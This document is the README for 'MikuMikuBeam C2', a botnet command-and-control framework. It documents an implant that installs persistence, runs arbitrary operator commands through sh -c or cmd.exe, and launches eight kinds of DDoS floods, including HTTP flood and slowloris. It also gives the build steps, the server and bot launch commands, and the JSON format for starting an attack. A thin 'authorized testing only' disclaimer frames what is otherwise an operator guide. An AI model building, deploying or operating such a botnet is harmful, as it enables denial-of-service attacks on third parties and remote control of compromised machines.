# MikuMikuBeam C2

<p align="center">
  <img src="https://media.tenor.com/UcpzfXzOr0MAAAAM/miku-miku-beam-hatsune-miku.gif" alt="Miku Miku Beam" width="360">
</p>

<p align="center">
  <b>A lightweight C2 framework with HMAC-authenticated channels, a modular DDoS engine, and a Miku-themed operator panel.</b>
</p>

<p align="center">
  <img alt="language" src="https://img.shields.io/badge/language-C%20%2F%20Python-blue">
  <img alt="platform" src="https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey">
  <img alt="license" src="https://img.shields.io/badge/license-MIT-green">
  <img alt="status" src="https://img.shields.io/badge/status-active-brightgreen">
</p>

---

## Overview

**MikuMikuBeam C2** is a compact command-and-control framework built for red-team labs and controlled stress-testing environments. It pairs a C implant (Linux/Windows) with a pure-Python C2 server and a browser-based operator panel.

Every frame on the wire is signed with **HMAC-SHA256**, protected by a nonce cache and a ±300s time window. The DDoS engine ships with **8 attack methods**, and all statistics are aggregated client-side before being pushed to the panel.

> **Authorized testing only.** See [Disclaimer](#disclaimer).

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Quick Start](#quick-start)
- [Configuration](#configuration)
- [Client Commands](#client-commands)
- [Project Layout](#project-layout)
- [Limitations](#limitations)
- [Disclaimer](#disclaimer)

---

## Features

### Secure Channel
- HMAC-SHA256 on **every** frame (`HELLO`, `CMD`, `CMD_ACK`, `CMD_RESULT`, `OUT`, `PING`/`PONG`)
- Anti-replay nonce cache with TTL — ring buffer (client) and `OrderedDict` with prune (server)
- ±300s timestamp window
- **PSK rotation** via `C2_PSK_PREV` — no downtime when keys change
- Timing-safe comparisons for UI password and HMAC

### DDoS Engine
| Method | Transport | Behavior |
|---|---|---|
| `http_flood` | HTTP | High-rate GET spam |
| `http_burst` | HTTP | Batched requests (64/burst) |
| `http_bypass` | HTTP | Randomized UA / XFF / paths |
| `http_slowloris` | HTTP | Slow header trickle |
| `tcp_flood` | TCP | Raw payload flood |
| `tcp_burst` | TCP | Connection bursts |
| `tcp_slowloris` | TCP | Byte-at-a-time send |
| `minecraft_ping` | UDP | MC handshake + ping |

- Client-side aggregation (`pps=N total=M` every 2s) — not 64 frames/sec
- Server-side summation, live PPS and total in UI

### Operator Experience
- Miku-themed web panel with progress bar and live console
- Optional password auth + HMAC token with refresh
- Bot persistence to `bots.json` across server restarts
- Exponential backoff reconnect with jitter (5s → 300s)
- Persistence on implant: systemd user unit (Linux) / Run key (Windows)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│  Operator (Browser)                                         │
│  ┌───────────────────────────────────────────────────────┐  │
│  │  Web UI (WebSocket, live stats, Miku theme)           │  │
│  └───────────────────────┬───────────────────────────────┘  │
│                          │ HTTP / WS                         │
│  ┌───────────────────────▼───────────────────────────────┐  │
│  │  C2 Server (Python 3)                                 │  │
│  │  ├─ accept_loop    HELLO + HMAC handshake             │  │
│  │  ├─ bot_reader     CMD / OUT / CMD_RESULT             │  │
│  │  ├─ reaper         timeouts, retries, orphans         │  │
│  │  └─ broadcast_cmd  fan-out with generation check      │  │
│  └───────────────────────┬───────────────────────────────┘  │
│                          │ TCP (JSON lines + HMAC)          │
└──────────────────────────┼──────────────────────────────────┘
                           │
        ┌──────────────────┼──────────────────┐
   ┌────▼────┐        ┌────▼────┐        ┌────▼────┐
   │ Bot #1  │        │ Bot #2  │        │ Bot #N  │
   │ client.c│        │ client.c│        │ client.c│
   └─────────┘        └─────────┘        └─────────┘
```

---

## Quick Start

### Requirements

| Component | Requirement |
|---|---|
| Server | Python **3.8+** (stdlib only) |
| Client (Linux) | `gcc`, `pthread` |
| Client (Windows) | MSVC (`cl`) |
| Target OS | Linux x86_64 / Windows x64 |

### 1 · Build the implant

```bash
# Linux
gcc -O2 -Wall -Wextra client.c -o client -lpthread

# Windows (MSVC)
cl /O2 client.c ws2_32.lib advapi32.lib
```

### 2 · Start the server

```bash
export C2_PSK=$(python3 -c "import os;print(os.urandom(32).hex())")
export C2_UI_PASSWORD='strong-password'
export C2_UI_SECRET=$(python3 -c "import os;print(os.urandom(32).hex())")

python3 server.py 4444 8080
```

```
============================================================
[*] HMAC PSK (put in client.c or C2_PSK env):
    a1b2c3d4... (64 hex chars)
============================================================
[*] C2 TCP :4444
[*] UI HTTP :8080  auth=on
```

Copy the PSK — the implant needs it.

### 3 · Launch a bot

```bash
export C2_PSK='a1b2c3d4...'
./client <SERVER_IP> 4444
```

The implant connects, sends `HELLO`, and PINGs every 15 seconds. The panel will show `Bot <uuid> @ <ip> [new]`.

### 4 · Open the panel

```
http://localhost:8080
```

Log in → set a target → choose a method → **Start Miku Beam**.

---

## Configuration

### Server

| Variable | Required | Description |
|---|---|---|
| `C2_PSK` | **Yes** | 64 hex chars. If unset, generated at startup and lost on restart |
| `C2_PSK_PREV` | No | Previous PSK, accepted during rotation |
| `C2_UI_PASSWORD` | No | Panel password. Unset = auth disabled |
| `C2_UI_SECRET` | No | HMAC secret for UI tokens. Unset = regenerated, tokens invalidate on restart |
| `C2_QUIET_PSK` | No | `1` — do not print PSK to stdout |
| `C2_AUDIO_URL` | No | Audio URL used by the panel (defaults to the Miku GIF) |

### Implant

| Variable | Required | Description |
|---|---|---|
| `C2_PSK` | **Yes** | Must match the server |
| `C2_PSK_PREV` | No | Accepted during key rotation |

---

## Client Commands

Commands are delivered from the server (UI or `c2>` console):

| Command | Action |
|---|---|
| `ddos_start {json}` | Start attack. JSON: `{"target":"...","method":"...","pktsize":64,"duration":60,"delay_ms":0,"threads":8}` |
| `ddos_stop` | Stop the current attack |
| `install_persist` | Install autostart |
| `uninstall_persist` | Remove autostart |
| `exit` | Terminate the process |
| *(any other string)* | Execute via `sh -c` (Linux) / `cmd.exe /c` (Windows) |

---

## Project Layout

```
.
├── client.c          # Implant (C, Linux/Windows)
├── server.py         # C2 server + web panel (Python 3, stdlib)
├── bots.json         # Auto-saved bot metadata (generated by server)
└── README.md
```

---

## Limitations

1. **Linux / Windows only** for the implant. macOS is untested.
2. **PSK is regenerated** if `C2_PSK` is unset — every server restart disconnects all bots. Always pin `C2_PSK` in production.
3. **`C2_UI_SECRET` unset** invalidates all UI tokens on restart.
4. **`bots.json` stores metadata only** (`id`, `ip`, `host`, `os`, `arch`, `last_seen`). Sockets are not restored — bots must reconnect on their own.
5. **Blocking `connect`/`send`** in DDoS workers — at 64 threads with slow targets this hits `ulimit -n`. Scaling requires `epoll` (not implemented).
6. **No automatic PSK rotation.** Manual procedure: generate new key → set `C2_PSK=new` + `C2_PSK_PREV=old` → restart server → update `C2_PSK` on implants.

---

## Disclaimer

This project is provided **for authorized security testing only**. Using it against systems without prior written consent from the owner is illegal and unethical. The maintainers assume **no liability** for any misuse or damage caused by this software.

By using this project you agree that you are solely responsible for complying with all applicable laws in your jurisdiction.

---
